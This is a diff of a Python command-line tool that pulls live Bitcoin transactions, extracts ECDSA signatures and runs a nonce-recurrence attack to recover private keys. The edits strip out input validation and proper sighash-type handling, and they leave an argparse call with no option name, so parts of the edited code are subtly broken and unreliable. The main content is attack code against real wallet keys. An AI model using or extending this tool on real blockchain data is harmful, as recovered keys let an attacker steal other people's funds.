@@ -2,7 +2,6 @@
 """Command line tool for exploiting nonce recurrences using live blockchain data."""
 import argparse
 import hashlib
-import io
 import json
 import logging
 import struct
@@ -14,26 +13,13 @@ import ecdsa
 import requests
 import sympy as sp
 from ecdsa.curves import SECP256k1
-from ecdsa.ellipticcurve import CurveFp
 from ecdsa.numbertheory import inverse_mod
 from requests import Response
 from sympy.abc import d as sym_d
 from sympy.polys.domains import ZZ
 
-try:
-    from bitcoin.core import CTransaction, b2lx
-except Exception:  # pragma: no cover - optional dependency
-    CTransaction = None
-    b2lx = None
-
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 LOGGER = logging.getLogger("nonce_recurrence_attack")
-
-SIGHASH_ALL = 0x01
-SIGHASH_NONE = 0x02
-SIGHASH_SINGLE = 0x03
-SIGHASH_OUTPUT_MASK = 0x1F
-SIGHASH_ANYONECANPAY = 0x80
 
 
 class TerminalColors:
@@ -107,117 +93,41 @@ class BlockchainComClient:
 
 
 def read_varint(buffer: bytes, offset: int) -> Tuple[int, int]:
-    if offset >= len(buffer):
-        raise ValueError("Unexpected end of transaction while reading varint")
     prefix = buffer[offset]
     offset += 1
     if prefix < 0xFD:
         return prefix, offset
     if prefix == 0xFD:
-        end = offset + 2
-        if end > len(buffer):
-            raise ValueError("Malformed varint: truncated uint16")
-        value = int.from_bytes(buffer[offset:end], "little")
+        value = int.from_bytes(buffer[offset : offset + 2], "little")
         return value, offset + 2
     if prefix == 0xFE:
-        end = offset + 4
-        if end > len(buffer):
-            raise ValueError("Malformed varint: truncated uint32")
-        value = int.from_bytes(buffer[offset:end], "little")
+        value = int.from_bytes(buffer[offset : offset + 4], "little")
         return value, offset + 4
-    end = offset + 8
-    if end > len(buffer):
-        raise ValueError("Malformed varint: truncated uint64")
-    value = int.from_bytes(buffer[offset:end], "little")
+    value = int.from_bytes(buffer[offset : offset + 8], "little")
     return value, offset + 8
 
 
-def _parse_with_python_bitcoinlib(raw_hex: str) -> Optional[Dict[str, Any]]:
-    if CTransaction is None or b2lx is None:
-        return None
-    try:
-        tx = CTransaction.stream_deserialize(io.BytesIO(bytes.fromhex(raw_hex)))
-    except Exception:  # pragma: no cover - optional dependency
-        return None
-
-    vin: List[Dict[str, Any]] = []
-    wit = getattr(tx, "wit", None)
-    for index, txin in enumerate(tx.vin):
-        witness_items: List[str] = []
-        if wit and getattr(wit, "vtxinwit", None) and index < len(wit.vtxinwit):
-            stack = getattr(wit.vtxinwit[index], "scriptWitness", None)
-            if stack and getattr(stack, "stack", None):
-                witness_items = [bytes(item).hex() for item in stack.stack]
-        vin.append(
-            {
-                "txid": b2lx(txin.prevout.hash),
-                "vout": txin.prevout.n,
-                "scriptSig": {"hex": bytes(txin.scriptSig).hex()},
-                "sequence": txin.nSequence,
-                "txinwitness": witness_items,
-            }
-        )
-
-    vout: List[Dict[str, Any]] = []
-    for index, txout in enumerate(tx.vout):
-        vout.append(
-            {
-                "n": index,
-                "value_satoshi": txout.nValue,
-                "scriptPubKey": {"hex": bytes(txout.scriptPubKey).hex()},
-            }
-        )
-
-    has_witness = False
-    if wit and getattr(wit, "vtxinwit", None):
-        has_witness = any(
-            getattr(item, "scriptWitness", None)
-            and getattr(item.scriptWitness, "stack", None)
-            and len(item.scriptWitness.stack) > 0
-            for item in wit.vtxinwit
-        )
-    elif hasattr(tx, "is_segwit"):
-        try:
-            has_witness = bool(tx.is_segwit())
-        except Exception:  # pragma: no cover - optional dependency
-            has_witness = False
-
-    return {
-        "version": getattr(tx, "nVersion", 1),
-        "locktime": getattr(tx, "nLockTime", 0),
-        "vin": vin,
-        "vout": vout,
-        "has_witness": has_witness,
-    }
-
-
-def _parse_raw_transaction_manual(raw_hex: str) -> Dict[str, Any]:
+def parse_raw_transaction(raw_hex: str) -> Dict[str, Any]:
     data = bytes.fromhex(raw_hex)
     cursor = 0
-    total_length = len(data)
-
-    def read_bytes(length: int) -> bytes:
-        nonlocal cursor
-        end = cursor + length
-        if end > total_length:
-            raise ValueError("Unexpected end of transaction while parsing")
-        chunk = data[cursor:end]
-        cursor = end
-        return chunk
-
-    version = int.from_bytes(read_bytes(4), "little")
-    marker_flag = data[cursor : cursor + 2] if cursor + 2 <= total_length else b"\x00\x00"
-    has_witness = marker_flag == b"\x00\x01"
-    if has_witness:
+    version = int.from_bytes(data[cursor : cursor + 4], "little")
+    cursor += 4
+    has_witness = False
+    if data[cursor : cursor + 2] == b"\x00\x01":
+        has_witness = True
         cursor += 2
     input_count, cursor = read_varint(data, cursor)
     vin: List[Dict[str, Any]] = []
     for _ in range(input_count):
-        prev_txid = read_bytes(32)[::-1].hex()
-        prev_vout = int.from_bytes(read_bytes(4), "little")
+        prev_txid = data[cursor : cursor + 32][::-1].hex()
+        cursor += 32
+        prev_vout = int.from_bytes(data[cursor : cursor + 4], "little")
+        cursor += 4
         script_len, cursor = read_varint(data, cursor)
-        script_sig = read_bytes(script_len)
-        sequence = int.from_bytes(read_bytes(4), "little")
+        script_sig = data[cursor : cursor + script_len]
+        cursor += script_len
+        sequence = int.from_bytes(data[cursor : cursor + 4], "little")
+        cursor += 4
         vin.append(
             {
                 "txid": prev_txid,
@@ -230,9 +140,11 @@ def _parse_raw_transaction_manual(raw_hex: str) -> Dict[str, Any]:
     output_count, cursor = read_varint(data, cursor)
     vout: List[Dict[str, Any]] = []
     for index in range(output_count):
-        value_sat = int.from_bytes(read_bytes(8), "little")
+        value_sat = int.from_bytes(data[cursor : cursor + 8], "little")
+        cursor += 8
         script_len, cursor = read_varint(data, cursor)
-        script_pubkey = read_bytes(script_len)
+        script_pubkey = data[cursor : cursor + script_len]
+        cursor += script_len
         vout.append(
             {
                 "n": index,
@@ -246,9 +158,11 @@ def _parse_raw_transaction_manual(raw_hex: str) -> Dict[str, Any]:
             witness_items: List[str] = []
             for _ in range(stack_count):
                 item_len, cursor = read_varint(data, cursor)
-                witness_items.append(read_bytes(item_len).hex())
+                item = data[cursor : cursor + item_len]
+                cursor += item_len
+                witness_items.append(item.hex())
             vin_entry["txinwitness"] = witness_items
-    locktime = int.from_bytes(read_bytes(4), "little")
+    locktime = int.from_bytes(data[cursor : cursor + 4], "little")
     return {
         "version": version,
         "locktime": locktime,
@@ -256,13 +170,6 @@ def _parse_raw_transaction_manual(raw_hex: str) -> Dict[str, Any]:
         "vout": vout,
         "has_witness": has_witness,
     }
-
-
-def parse_raw_transaction(raw_hex: str) -> Dict[str, Any]:
-    parsed = _parse_with_python_bitcoinlib(raw_hex)
-    if parsed is not None:
-        return parsed
-    return _parse_raw_transaction_manual(raw_hex)
 
 
 def sha256d(data: bytes) -> bytes:
@@ -337,81 +244,27 @@ def decimal_satoshi(value: Any) -> int:
 
 
 def legacy_sighash(tx: Dict[str, Any], input_index: int, script_bytes: bytes, sighash_type: int) -> int:
-    if input_index < 0 or input_index >= len(tx.get("vin", [])):
-        raise IndexError("Input index out of range for sighash computation")
-
-    hash_flag = sighash_type & 0xFF
-    base_type = hash_flag & SIGHASH_OUTPUT_MASK
-    anyone_can_pay = bool(hash_flag & SIGHASH_ANYONECANPAY)
-
-    if base_type not in {SIGHASH_ALL, SIGHASH_NONE, SIGHASH_SINGLE}:
-        base_type = SIGHASH_ALL
-
-    if base_type == SIGHASH_SINGLE and input_index >= len(tx.get("vout", [])):
-        # Bitcoin Core returns 1 in this scenario; propagate the same sentinel value.
-        return 1
-
     version = struct.pack("<I", tx.get("version", 1))
-
-    def serialize_input(vin: Dict[str, Any], script: bytes, sequence_override: Optional[int] = None) -> bytes:
-        sequence = vin.get("sequence", 0xFFFFFFFF) if sequence_override is None else sequence_override
+    serialized_inputs = [encode_varint(len(tx["vin"]))]
+    for idx, vin in enumerate(tx["vin"]):
         prev_txid = bytes.fromhex(vin["txid"])[::-1]
         prev_vout = struct.pack("<I", vin["vout"])
-        return (
-            prev_txid
-            + prev_vout
-            + encode_varint(len(script))
-            + script
-            + struct.pack("<I", sequence & 0xFFFFFFFF)
-        )
-
-    inputs: List[bytes] = []
-    if anyone_can_pay:
-        vin = tx["vin"][input_index]
-        inputs.append(serialize_input(vin, script_bytes))
-        serialized_inputs = encode_varint(1) + b"".join(inputs)
-    else:
-        for idx, vin in enumerate(tx["vin"]):
-            script = script_bytes if idx == input_index else b""
-            sequence = vin.get("sequence", 0xFFFFFFFF)
-            if idx != input_index and base_type in (SIGHASH_NONE, SIGHASH_SINGLE):
-                sequence = 0
-            inputs.append(serialize_input(vin, script, sequence_override=sequence))
-        serialized_inputs = encode_varint(len(inputs)) + b"".join(inputs)
-
-    outputs: List[bytes] = []
-    if base_type == SIGHASH_ALL:
-        relevant_outputs = tx.get("vout", [])
-        for vout in relevant_outputs:
-            if "value" in vout:
-                amount_sat = decimal_satoshi(vout["value"])
-            else:
-                amount_sat = vout.get("value_satoshi", 0)
-            script = bytes.fromhex(vout["scriptPubKey"]["hex"])
-            outputs.append(struct.pack("<Q", amount_sat) + encode_varint(len(script)) + script)
-        serialized_outputs = encode_varint(len(outputs)) + b"".join(outputs)
-    elif base_type == SIGHASH_NONE:
-        serialized_outputs = encode_varint(0)
-    else:  # SIGHASH_SINGLE
-        for idx in range(input_index + 1):
-            if idx >= len(tx.get("vout", [])):
-                outputs.append(struct.pack("<Q", 0) + encode_varint(0))
-                continue
-            vout = tx["vout"][idx]
-            if idx == input_index:
-                if "value" in vout:
-                    amount_sat = decimal_satoshi(vout["value"])
-                else:
-                    amount_sat = vout.get("value_satoshi", 0)
-                script = bytes.fromhex(vout["scriptPubKey"]["hex"])
-                outputs.append(struct.pack("<Q", amount_sat) + encode_varint(len(script)) + script)
-            else:
-                outputs.append(struct.pack("<Q", 0) + encode_varint(0))
-        serialized_outputs = encode_varint(len(outputs)) + b"".join(outputs)
-
+        script = script_bytes if idx == input_index else b""
+        script_length = encode_varint(len(script))
+        sequence = struct.pack("<I", vin.get("sequence", 0xFFFFFFFF))
+        serialized_inputs.append(prev_txid + prev_vout + script_length + script + sequence)
+    serialized_outputs = [encode_varint(len(tx["vout"]))]
+    for vout in tx["vout"]:
+        if "value" in vout:
+            amount_sat = decimal_satoshi(vout["value"])
+        else:
+            amount_sat = vout.get("value_satoshi", 0)
+        amount = struct.pack("<Q", amount_sat)
+        script = bytes.fromhex(vout["scriptPubKey"]["hex"])
+        serialized_outputs.append(amount + encode_varint(len(script)) + script)
     locktime = struct.pack("<I", tx.get("locktime", 0))
-    hash_type_bytes = struct.pack("<I", hash_flag)
-    preimage = version + serialized_inputs + serialized_outputs + locktime + hash_type_bytes
+    hash_type = struct.pack("<I", sighash_type)
+    preimage = version + b"".join(serialized_inputs) + b"".join(serialized_outputs) + locktime + hash_type
     return int.from_bytes(sha256d(preimage), "big")
 
 
@@ -455,7 +308,7 @@ def collect_signatures_from_transaction(
         signature_with_type, _pubkey_hex = sig_info
         if not signature_with_type:
             continue
-        sighash_type = int(signature_with_type[-1]) & 0xFF
+        sighash_type = signature_with_type[-1]
         der_signature = signature_with_type[:-1]
         try:
             r, s = parse_der_signature(der_signature)
@@ -468,17 +321,7 @@ def collect_signatures_from_transaction(
             "vin": parsed_tx["vin"],
             "vout": parsed_tx["vout"],
         }
-        try:
-            z = legacy_sighash(tx_for_hash, index, script_bytes, sighash_type)
-        except (IndexError, ValueError):
-            continue
-        if (
-            z == 1
-            and (sighash_type & SIGHASH_OUTPUT_MASK) == SIGHASH_SINGLE
-            and index >= len(parsed_tx.get("vout", []))
-        ):
-            # Skip buggy SINGLE hashes that cannot be validated.
-            continue
+        z = legacy_sighash(tx_for_hash, index, script_bytes, sighash_type)
         results.append((z, ecdsa.ecdsa.Signature(r, s)))
     return results
 
@@ -488,7 +331,7 @@ class ECDSANonceRecurrenceAttack:
 
     def __init__(
         self,
-        curve: CurveFp = SECP256k1,
+        curve: ecdsa.ecdsa.CurveFp = SECP256k1,
         signatures_count: int = 7,
         verbose: bool = True,
     ) -> None:
@@ -716,11 +559,11 @@ class ECDSANonceRecurrenceAttack:
             pubkey_point = private_key * g
             pubkey = ecdsa.ecdsa.Public_key(g, pubkey_point)
             for i, sig in enumerate(signatures):
-                if pubkey.verifies(h[i] % self.order, sig):
-                    return True
+                if not pubkey.verifies(h[i] % self.order, sig):
+                    return False
         except Exception:
             return False
-        return False
+        return True
 
 
 def main() -> None:
@@ -755,14 +598,11 @@ def main() -> None:
         type=int,
         help="Max permutations to try (default: all permutations)",
     )
-    parser.add_argument("--verbose", action="store_true", dest="verbose", help="Enable verbose output")
     parser.add_argument(
-        "--quiet",
-        action="store_false",
-        dest="verbose",
-        help="Disable verbose output",
+        action=argparse.BooleanOptionalAction,
+        default=True,
+        help="Enable verbose output (on by default)",
     )
-    parser.set_defaults(verbose=True)
     args = parser.parse_args()
 
     curve_map = {
